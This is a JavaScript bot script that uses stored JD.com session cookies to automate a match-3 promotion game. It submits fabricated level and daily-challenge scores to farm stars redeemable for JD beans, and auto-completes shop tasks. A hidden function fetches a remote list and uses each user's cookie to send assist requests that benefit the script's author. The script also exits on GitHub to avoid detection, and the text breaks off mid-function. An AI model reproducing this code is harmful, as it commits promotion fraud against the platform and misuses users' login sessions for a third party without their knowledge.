/*
 * @Author: shylocks https://github.com/shylocks
 * @Date: 2021-01-15 16:25:41
 * @Last Modified by:   shylocks
 * @Last Modified time: 2021-01-16 18:25:41
 */
/*
工业品爱消除
活动共200关，通关可获得3星，600星可兑换1888京豆，按照cron运行只需7天即可得到
感谢@yogayyy(https://github.com/yogayyy/Scripts)制作的图标
活动入口：京东app首页-京东工业品-京东工业品年末盛典-勇闯消消乐
已支持IOS双京东账号,Node.js支持N个京东账号
boxjs 填写具体兑换商品的名称，默认为1888京豆
脚本兼容: QuantumultX, Surge, Loon, JSBox, Node.js
============Quantumultx===============
[task_local]
#工业品爱消除
20 * * * * https://raw.githubusercontent.com/shylocks/Loon/main/jd_gyec.js, tag=工业品爱消除, img-url=https://raw.githubusercontent.com/yogayyy/Scripts/master/Icon/shylocks/jd_gyec.jpg, enabled=true

================Loon==============
[Script]
cron "20 * * * *" script-path=https://raw.githubusercontent.com/shylocks/Loon/main/jd_gyec.js,tag=工业品爱消除

===============Surge=================
工业品爱消除 = type=cron,cronexp="20 * * * *",wake-system=1,timeout=200,script-path=https://raw.githubusercontent.com/shylocks/Loon/main/jd_gyec.js

============小火箭=========
工业品爱消除 = type=cron,script-path=https://raw.githubusercontent.com/shylocks/Loon/main/jd_gyec.js, cronexpr="20 * * * *", timeout=200, enable=true
 */
const $ = new Env('工业品爱消除');
const notify = $.isNode() ? require('./sendNotify') : '';
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
let inviteCodes = [
  '840266@2585219@2586018@1556311@2583822@2585256@756497@1234613',
  '840266@2585219@2586018@1556311@2583822@2585256@756497@1234613',
]
const ACT_ID = 'A_112790_R_4_D_20201209'
let exchangeName = $.isNode() ? (process.env.EXCHANGE_GYEC ? process.env.EXCHANGE_GYEC : '1888京豆') : ($.getdata('JDGYEC') ? $.getdata('JDGYEC') : '1888京豆')
//Node.js用户请在jdCookie.js处填写京东ck;
//IOS等用户直接用NobyDa的jd cookie
let cookiesArr = [], cookie = '', message;
if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  })
  if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {
  };
  if(JSON.stringify(process.env).indexOf('GITHUB')>-1) process.exit(0)
} else {
  let cookiesData = $.getdata('CookiesJD') || "[]";
  cookiesData = jsonParse(cookiesData);
  cookiesArr = cookiesData.map(item => item.cookie);
  cookiesArr.reverse();
  cookiesArr.push(...[$.getdata('CookieJD2'), $.getdata('CookieJD')]);
  cookiesArr.reverse();
  cookiesArr = cookiesArr.filter(item => item !== "" && item !== null && item !== undefined);
}

function obj2param(obj) {
  let str = "";
  for (let key in obj) {
    if (str !== "") {
      str += "&";
    }
    str += key + "=" + encodeURIComponent(obj[key]);
  }
  return str
}

!(async () => {
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/', {"open-url": "https://bean.m.jd.com/"});
    return;
  }
  $.shareCodesArr = []
  await requireConfig()
  console.log(`您要兑换的商品名称为${exchangeName}`)
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=(.+?);/) && cookie.match(/pt_pin=(.+?);/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      message = '';
      await TotalBean();
      console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/`, {"open-url": "https://bean.m.jd.com/"});
        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        } else {
          $.setdata('', `CookieJD${i ? i + 1 : ""}`);//cookie失效，故清空cookie。$.setdata('', `CookieJD${i ? i + 1 : "" }`);//cookie失效，故清空cookie。
        }
        continue
      }
      await shareCodesFormat()
      await jdGy()
      await getAuthorShareCode()
    }
  }
})()
  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })

async function jdGy(help = true) {
  $.reqId = 1
  try{
    await getIsvToken()
    await getIsvToken2()
    await getActInfo()
    await getTaskList()
    await getDailyMatch()
    if (help) {
      await helpFriends()
    }
    // await marketGoods()
    await play()
  }
  catch (e) {
    console.log(e)
  }
}

async function helpFriends() {
  for (let code of $.newShareCodes) {
    if (!code) continue
    console.log(`去助力好友${code}`)
    await getActInfo(code)
    await $.wait(500)
  }
}

// 获得IsvToken
function getIsvToken() {
  return new Promise(resolve => {
    $.post(jdUrl('encrypt/pin?appId=dafbe42d5bff9d82298e5230eb8c3f79'), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${err},${jsonParse(resp.body)['message']}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            $.lkEPin = data.data
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

// 获得对应游戏的访问Token
function getIsvToken2() {
  return new Promise(resolve => {
    $.post(jdUrl('user/token?appId=dafbe42d5bff9d82298e5230eb8c3f79&client=m&url=pengyougou.m.jd.com'), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${err},${jsonParse(resp.body)['message']}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            $.token = data.data
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

function getActInfo(inviter = null) {
  let body = {
    "inviter": inviter,
    "activeId": ACT_ID,
    "refid": "wojing",
    "lkEPin": $.lkEPin,
    "token": $.token,
    "un_area": "12_904_908_57903",
    "source": "wojing",
    "scene": "3"
  }
  return new Promise(resolve => {
    $.post(taskUrl("platform/active/role/login", body), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${err}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            if (!inviter) {
              data = JSON.parse(data);
              $.info = data.info
              $.id = data.id
              $.authcode = data.authcode
              $.to = data.token
              $.money = JSON.parse(data.info.platform)['money']
              console.log(`您的好友助力码为：${$.id}`)
              console.log(`当前星星：${$.money}`)
              // SecrectUtil2.InitEncryptInfo(data.token, data.info.pltId)
              await checkLogin()
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

function checkLogin() {
  return new Promise(resolve => {
    $.post(taskUrl("eliminate_jdmy/game/local/logincheck", {
      info: JSON.stringify($.info),
      "reqsId": $.reqId++
    }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${err}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            $.gameId = data.role.gameId
            $.gameToken = data.token
            $.strength = data.role.items['8003']
            console.log(`当前体力：${$.strength}`)
            $.not3Star = []
            for(let level of data.role.allLevels){
              if(level.maxStar!==3){
                $.not3Star.push(level.id)
              }
            }
            if(data.role.allLevels.length)
              $.level = parseInt(data.role.allLevels[data.role.allLevels.length-1]['id'])
            else
              $.level = 1
            if($.not3Star.length)
              console.log(`当前尚未三星的关卡为：${$.not3Star.join(',')}`)
            // SecrectUtil.InitEncryptInfo($.gameToken, $.gameId)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

function getTaskList() {
  return new Promise(resolve => {
    $.post(taskUrl("platform/active/jingdong/gametasks", {
        "activeid": ACT_ID,
        "id": $.id,
        "token": $.gameToken,
        "authcode": $.authcode,
      }),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${err}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data)
              for (let task of data.tasks) {
                if (task.res.sName === "逛逛店铺" || task.res.sName === "浏览会场") {
                  if (task.state.iFreshTimes < task.res.iFreshTimes)
                    console.log(`去做${task.res.sName}任务`)
                  for (let i = task.state.iFreshTimes; i < task.res.iFreshTimes; ++i) {
                    await uploadTask(task.res.eType, task.res.iValue)
                    await $.wait(500)
                    await finishTask(task.res.sID)
                  }
                } else if (task.res.sName === "收藏商品") {
                  if (task.state.iFreshTimes < task.res.iFreshTimes) {
                    console.log(`去做${task.res.sName}任务`)
                    let body = {
                      "api": "followSku",
                      "skuId": task.adInfo.sValue,
                      "id": $.id,
                      "activeid": ACT_ID,
                      "activeId": ACT_ID,
                      "authcode": $.authcode,
                    }
                    await execute(body)
                    await $.wait(500)
                    await finishTask(task.res.sID)
                  }
                } else if (task.res.sName === '加入会员') {
                  continue
                  if (!task.state.get) {
                    console.log(`去做${task.res.sName}任务`)
                    let body = {
                      "api": "checkMember",
                      "memberId": task.adInfo.sValue,
                      "id": $.id,
                      "activeid": ACT_ID,
                      "activeId": ACT_ID,
                      "authcode": $.authcode,
                    }
                    await execute(body)
                    // await uploadTask(task.res.eType,task.res.iValue)
                    await $.wait(500)
                    await finishTask(task.res.sID)
                  }
                } else if (task.res.sName === '下单有礼') {
                  // console.log(task)
                } else if (task.res.sName === '商品加购') {
                  for (let i = task.state.iFreshTimes; i < task.res.iFreshTimes; ++i) {
                    console.log(`去做${task.res.sName}任务`)
                    let body = {
                      "api": "addProductToCart",
                      "skuList": task.adInfo.sValue,
                      "id": $.id,
                      "activeid": ACT_ID,
                      "activeId": ACT_ID,
                      "authcode": $.authcode,
                    }
                    await execute(body)
                    await $.wait(500)
                    await finishTask(task.res.sID)
                  }
                } else if (task.res.sName === '关注店铺') {
                  if (task.state.iFreshTimes < task.res.iFreshTimes)
                    console.log(`去做${task.res.sName}任务`)
                  for (let i = task.state.iFreshTimes; i < task.res.iFreshTimes; ++i) {
                    let body = {
                      "api": "followShop",
                      "shopId": task.adInfo.sValue,
                      "id": $.id,
                      "activeid": ACT_ID,
                      "activeId": ACT_ID,
                      "authcode": $.authcode,
                    }
                    await execute(body)
                    await $.wait(500)
                    await finishTask(task.res.sID)
                  }
                } else if (task.res.sName === '喂养狗狗' || task.res.sName === '每日签到') {
                  if (!task.state.get) {
                    console.log(`去做${task.res.sName}任务`)
                    await uploadTask(task.res.eType, task.res.iValue)
                    await $.wait(500)
                    await finishTask(task.res.sID)
                  }
                } else if (task.res.sName === '关注频道') {
                  if (!task.state.get) {
                    console.log(`去做${task.res.sName}任务`)
                    let body = {
                      "api": "followChannel",
                      "channelId": task.adInfo.sValue,
                      "id": $.id,
                      "activeid": ACT_ID,
                      "activeId": ACT_ID,
                      "authcode": $.authcode,
                    }
                    await execute(body)
                    await $.wait(500)
                    await finishTask(task.res.sID)
                  }
                } else if (task.res.sName === '好友助力') {
                  console.log(`去领取好友助力任务`)
                  await finishTask(task.res.sID)
                }
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

function rand(min, max) {
  min = Math.ceil(min);
  max = Math.floor(max);
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

async function beginLevel() {
  let body = {
    'gameId': $.gameId,
    'token': $.gameToken,
    'levelId': $.level,
    // 'score': 600000 + rand(1000,10000),
    'reqsId': $.reqId++
  }
  return new Promise(resolve => {
    $.post(taskUrl("eliminate_jdmy/game/local/beginLevel", obj2param(body), true),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${err}`)
            console.log(resp)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data)
              // console.log(data)
              if (data.code === 0) {
                console.log(`第${$.level}关卡开启成功，等待30秒完成`)
                $.strength -= 5
                await $.wait(30000)
                await endLevel()
              } else if (data.code === 20001) {
                $.strength = 0
                console.log(`关卡开启失败，体力不足`)
              } else {
                $.strength = 0
                // console.log(`关卡开启失败，未知错误`)
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

function endLevel() {
  let body = {
    'gameId': $.gameId,
    'token': $.gameToken,
    'levelId': $.level,
    'score': 600000 + rand(100000, 300000),
    'reqsId': $.reqId++
  }
  return new Promise(resolve => {
    $.post(taskUrl("eliminate_jdmy/game/local/endLevel", obj2param(body), true),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${err}`)
            console.log(resp)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data)
              // console.log(data)
              if (data.code === 0) {
                const level = data.allLevels.filter(vo => parseInt(vo.id) === $.level)
                if (level.length > 0) {
                  console.log(`第${$.level++}关已通关，上报${level[0].maxScore}分，获得${level[0].maxStar}星星`)
                } else {
                  console.log(`第${$.level}关分数上报失败，错误信息:${JSON.stringify(data)}`)
                }
              } else {
                console.log(`第${$.level}关分数上报失败，错误信息:${JSON.stringify(data)}`)
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

function uploadTask(taskType, value) {
  let body = {
    "taskType": taskType,
    "value": value,
    "id": $.id,
    "activeid": ACT_ID,
    "activeId": ACT_ID,
    "authcode": $.authcode,
  }
  return new Promise(resolve => {
    $.post(taskUrl("platform//role/base/uploadtask", body),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${err}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data)
              if (data.code === 0) {
                console.log('任务上报成功')
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

function finishTask(taskId) {
  let body = {
    "taskid": taskId,
    "id": $.id,
    "activeid": ACT_ID,
    "activeId": ACT_ID,
    // "inviter": undefined,
    "token": $.to,
    "authcode": $.authcode
  }
  return new Promise(resolve => {
    $.post(taskUrl("/platform/active/jingdong/finishtask", body),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${err}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data)
              if (data.code === 0) {
                let msg = `任务完成成功，获得`
                for (let item of data.item) {
                  if (item['itemid'] === 'JD01') {
                    msg += ` 体力*${item['count']}`
                  } else if (item['itemid'] === 'X028') {
                    msg += ` 消消乐星星*${item['count']}`
                  } else {
                    msg += ` ${item['itemid']}*${item['count']}`
                  }
                }
                console.log(msg)
              } else {
                // console.log(`任务完成失败，错误信息：${JSON.stringify(data)}`)
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

function execute(body) {
  return new Promise(resolve => {
    $.post(taskUrl("/platform/active/jingdong/execute", body),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${err}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data)
              if (data.code === 0) {
                console.log('任务上报成功')
              } else {
                console.log(`任务上报失败，错误信息：${JSON.stringify(data)}`)
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

function marketGoods() {
  let body = {
    "id": $.id,
    "activeid": ACT_ID,
    "activeId": ACT_ID,
    "token": $.to,
    "authcode": $.authcode
  }
  return new Promise(resolve => {
    $.post(taskUrl("/platform/active/role/marketgoods", body),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${err}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data)
              if (data.code === 0) {
                for (let vo of data.list) {
                  if (vo.name === exchangeName) {
                    let cond = vo['res']['asConsume'][0].split(',')
                    await buyGood(vo['res']['sID'])
                  }
                }
              } else {
                // console.log(`任务完成失败，错误信息：${JSON.stringify(data)}`)
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

async function play() {
  $.level += 1
  console.log(`当前关卡：${$.level}`)
  while ($.strength >= 5 && $.level <= 280) {
    await beginLevel()
  }
  if($.not3Star.length && $.strength >= 5){
    console.log(`去完成尚未三星的关卡`)
    for(let level of $.not3Star){
      $.level = parseInt(level)
      await beginLevel()
      if($.strength<5) break
    }
  }
}

function buyGood(consumeid) {
  let body = {
    "consumeid": consumeid,
    "id": $.id,
    "activeid": ACT_ID,
    "activeId": ACT_ID,
    "token": $.to,
    "authcode": $.authcode
  }
  return new Promise(resolve => {
    $.post(taskUrl("/platform/active/role/marketbuy", body),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${err}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data)
              if (data.code === 0) {
                console.log(`商品兑换成功，获得${data.item[0].itemid === 'JD29' ? '京豆' : '未知奖品'} * ${data.item[0].count}`)
              } else {
                console.log(`任务完成失败，错误信息：${JSON.stringify(data)}`)
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}


function getDailyMatch() {
  let body = {
    'gameId': $.gameId,
    'token': $.gameToken,
    'reqsId': $.reqId++
  }
  return new Promise(resolve => {
    $.post(taskUrl("eliminate_jd/game/local/getDailyMatch", obj2param(body), true),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${err}`)
            console.log(resp)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data)
              // console.log(data)
              if (data.code === 0) {
                // console.log(data)
                $.maxScore = parseInt(data.dailyMatchList[data.dailyMatchList.length - 1]['sScore'])
                if (data.dayInfo.score >= $.maxScore && data.dayInfo.boxAwardIndex < 2) {
                  await getDailyMatchAward()
                }
                if (data.dayInfo.dayPlayNums < 2) {
                  await beginDailyMatch()
                }
              } else {
                console.log(`暂无每日挑战任务`)
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

function beginDailyMatch() {
  let body = {
    'gameId': $.gameId,
    'token': $.gameToken,
    'reqsId': $.reqId++,
    'levelId': $.curLevel
  }
  return new Promise(resolve => {
    $.post(taskUrl("eliminate_jd/game/local/beginDailyMatch", obj2param(body), true),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${err}`)
            console.log(resp)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data)
              // console.log(data)
              if (data.code === 0) {
                console.log(`每日挑战开启成功，本日挑战次数${data.dayInfo.dayPlayNums}/2`)
                $.curLevel = data.dayInfo.curLevel
                await $.wait(30000)
                await endDailyMatch()
              } else {
                console.log(`每日挑战开启失败，错误信息：${JSON.stringify(data)}`)
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

function endDailyMatch() {
  let body = {
    'gameId': $.gameId,
    'token': $.gameToken,
    'reqsId': $.reqId++,
    'score': Math.trunc($.maxScore / 2) + 3,
    'levelId': $.curLevel,
  }
  return new Promise(resolve => {
    $.post(taskUrl("eliminate_jd/game/local/endDailyMatch", obj2param(body), true),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${err}`)
            console.log(resp)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data)
              // console.log(data)
              if (data.code === 0) {
                console.log(`每日挑战完成成功，本日分数${data.dayInfo.score}`)
              } else {
                console.log(`每日挑战完成失败，错误信息：${JSON.stringify(data)}`)
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

function getDailyMatchAward() {
  let body = {
    'gameId': $.gameId,
    'token': $.gameToken,
    'reqsId': $.reqId++
  }
  return new Promise(resolve => {
    $.post(taskUrl("eliminate_jd/game/local/getDailyMatchAward", obj2param(body), true),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${err}`)
            console.log(resp)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data)
              // console.log(data)
              if (data.code === 0) {
                console.log(`每日挑战领取成功，获得${data.reward[0] === '11001' ? '消消乐星星' : '未知道具'}*${data.reward[1]}`)
              } else {
                console.log(`每日挑战领取失败，错误信息：${JSON.stringify(data)}`)
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}
function taskUrl(functionId, body = {}, decrypt = false) {
  return {
    url: `https://jd.moxigame.cn/${functionId}`,
    body: decrypt ? body : JSON.stringify(body),
    headers: {
      'Host': 'jd.moxigame.cn',
      'Connection': 'keep-alive',
      'Content-Type': decrypt ? 'application/x-www-form-urlencoded' : 'application/json',
      'Referer': 'https://game-cdn.moxigame.cn/eliminateJD/index.html?activeId=A_112790_R_4_D_20201209',
      'User-Agent': $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0") : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
      'Accept-Language': 'zh-cn',
      'Accept-Encoding': 'gzip, deflate, br',
    }
  }
}

function jdUrl(functionId, body = '') {
  return {
    url: `https://jdjoy.jd.com/saas/framework/${functionId}`,
    body: body,
    headers: {
      'Host': 'jdjoy.jd.com',
      'accept': '*/*',
      'user-agent': 'JD4iPhone/167490 (iPhone; iOS 14.2; Scale/3.00)',
      'accept-language': 'zh-Hans-JP;q=1, en-JP;q=0.9, zh-Hant-TW;q=0.8, ja-JP;q=0.7, en-US;q=0.6',
      'content-type': 'application/x-www-form-urlencoded',
      'Cookie': cookie
    }
  }
}

function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0") : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      }
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            $.nickName = data['base'].nickname;
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}


//格式化助力码
function shareCodesFormat() {
  return new Promise(async resolve => {
    // console.log(`第${$.index}个京东账号的助力码:::${$.shareCodesArr[$.index - 1]}`)
    $.newShareCodes = [];
    if ($.shareCodesArr[$.index - 1]) {
      $.newShareCodes = $.shareCodesArr[$.index - 1].split('@');
    } else {
      console.log(`由于您第${$.index}个京东账号未提供shareCode,将采纳本脚本自带的助力码\n`)
      const tempIndex = $.index > inviteCodes.length ? (inviteCodes.length - 1) : ($.index - 1);
      $.newShareCodes = inviteCodes[tempIndex].split('@');
    }
    const readShareCodeRes = null //await readShareCode();
    if (readShareCodeRes && readShareCodeRes.code === 200) {
      $.newShareCodes = [...new Set([...$.newShareCodes, ...(readShareCodeRes.data || [])])];
    }
    console.log(`第${$.index}个京东账号将要助力的好友${JSON.stringify($.newShareCodes)}`)
    resolve();
  })
}

function requireConfig() {
  return new Promise(resolve => {
    console.log(`开始获取${$.name}配置文件\n`);
    //Node.js用户请在jdCookie.js处填写京东ck;
    const shareCodes = []
    console.log(`共${cookiesArr.length}个京东账号\n`);
    $.shareCodesArr = [];
    if ($.isNode()) {
      Object.keys(shareCodes).forEach((item) => {
        if (shareCodes[item]) {
          $.shareCodesArr.push(shareCodes[item])
        }
      })
    }
    console.log(`您提供了${$.shareCodesArr.length}个账号的${$.name}助力码\n`);
    resolve()
  })
}

function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}
function getAuthorShareCode() {
  return new Promise(resolve => {
    $.get({url: "https://gitee.com/shylocks/updateTeam/raw/main/jd_super.json",headers:{
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }}, async (err, resp, data) => {
      try {
        if (err) {
        } else {
          let headers = {
            'Host': 'api.m.jd.com',
            'accept': 'application/json, text/plain, */*',
            'origin': 'https://h5.m.jd.com',
            'user-agent': 'jdapp;iPhone;9.3.5;14.2;53f4d9c70c1c81f1c8769d2fe2fef0190a3f60d2;network/wifi;supportApplePay/0;hasUPPay/0;hasOCPay/0;model/iPhone10,2;addressid/137923973;supportBestPay/0;appBuild/167515;jdSupportDarkMode/0;pv/2217.74;apprpd/MyJD_PersonalSpace;ref/MySpace;psq/8;ads/;psn/53f4d9c70c1c81f1c8769d2fe2fef0190a3f60d2|8703;jdv/0|kong|t_1000170135|tuiguang|notset|1610674234917|1610674234;adk/;app_device/IOS;pap/JA2015_311210|9.3.5|IOS 14.2;Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1',
            'accept-language': 'zh-cn',
            'referer': 'https://h5.m.jd.com/babelDiy/Zeus/25C6dc6HY6if6DT7e58A1pi2Vxe4/index.html?activityId=73cf1fe89d33433d9cc8688d1892d432&assistId=R2u2OCB9eEbcCVB_CiVKhg&lng=118.715991&lat=32.201090&sid=8db5aee7d526915dee1c6502d5f4578w&un_area=12_904_908_57903',
            'Cookie': cookie
          }
          let body = JSON.parse(data)
          for(let vo of body) {
            if (vo) {
              const options = {
                url: `https://api.m.jd.com/client.action?clientVersion=9.3.5&client=wh5&functionId=smtfission_assist&appid=smtFission&body=${escape(JSON.stringify(body))}`,
                headers: headers
              }
              $.get(options)
            }
          }
        }
      } catch (e) {
        // $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '不要在BoxJS手动复制粘贴修改cookie')
      return [];
    }
  }
}
// prettier-ignore
function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const 